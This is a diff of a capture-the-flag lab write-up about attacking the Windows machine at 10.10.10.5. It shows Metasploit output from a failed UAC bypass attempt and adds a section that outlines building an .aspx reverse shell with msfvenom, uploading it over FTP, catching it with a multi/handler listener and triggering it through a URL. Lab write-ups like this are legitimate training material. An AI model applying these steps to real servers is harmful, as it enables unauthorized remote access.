@@ -239,7 +239,7 @@ msf5 > use exploit/windows/local/bypassuac
 [-] Exploit aborted due to failure: none: Already in elevated state
 [*] Exploit completed, but no session was created.
 ```
-Nope, didn't work. Probably because of `shell sparc/bsd`.
+Nope, didn't work. Probably because of type `shell sparc/bsd` under sessions.
 ```
 Active sessions
 ===============
@@ -355,3 +355,9 @@ C:\Windows\system32 NT SERVICE\TrustedInstaller:(F)
 ...
 ```
 We don't find anything interesting we can use, or know how to use unfortunately.
+
+## Another Reverse Shell, with Meterpreter & MSFVenom
+Let's generate a custom `.aspx` reverse shell. [Source](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit)
+`ftp> put devel.aspx`.
+Of course run a `msf5 > use exploit/multi/handler`.
+`http://10.10.10.5/devel.aspx`.
